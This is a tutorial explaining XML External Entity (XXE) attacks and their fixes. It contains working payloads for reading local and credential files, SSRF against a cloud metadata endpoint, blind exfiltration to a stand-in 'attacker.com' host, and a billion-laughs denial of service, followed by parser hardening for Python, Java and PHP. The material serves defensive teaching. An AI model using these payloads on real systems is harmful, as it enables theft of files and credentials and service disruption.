XXE (XML External Entity) — How It Works

What is an XML entity?

Entities are XML shortcuts for reusable strings. Internal entities are safe:

<!DOCTYPE example [ <!ENTITY name "Alice"> ]>
<greeting>Hello, &name;!</greeting>
<!-- renders: Hello, Alice! -->

External entities tell the parser to fetch a value from a URL or file:

<!ENTITY secret SYSTEM "file:///etc/passwd">

The attack

<?xml version="1.0"?>
<!DOCTYPE invoice [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<invoice>
  <note>&xxe;</note>     ← parser replaces this with the file contents
</invoice>

If the server echoes the <note> field back in its response, the file contents appear in the API output.

Attack variants

File read

<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "file:///.env">
<!ENTITY xxe SYSTEM "file:///proc/self/environ">

SSRF via http entity

<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">

The server makes the HTTP request — giving access to internal services unreachable from the attacker's machine. The AWS metadata endpoint returns IAM credentials.

Blind XXE (out-of-band)

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % oob "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">

When the server doesn't echo output, exfiltrate via a DNS/HTTP callback.

Billion laughs (DoS)

<!ENTITY lol  "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">

10 levels → 10^10 entity expansions → gigabytes of memory consumed.

The Fix

# Python (defusedxml)
import defusedxml.ElementTree as ET
tree = ET.parse(xml_file)   # DTD and external entities disabled by default

# Java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);

# PHP
libxml_disable_entity_loader(true);   // deprecated in PHP 8 — disabled by default

The safest approach: disable DTD processing entirely. If DTDs are needed, disable external entity loading specifically.
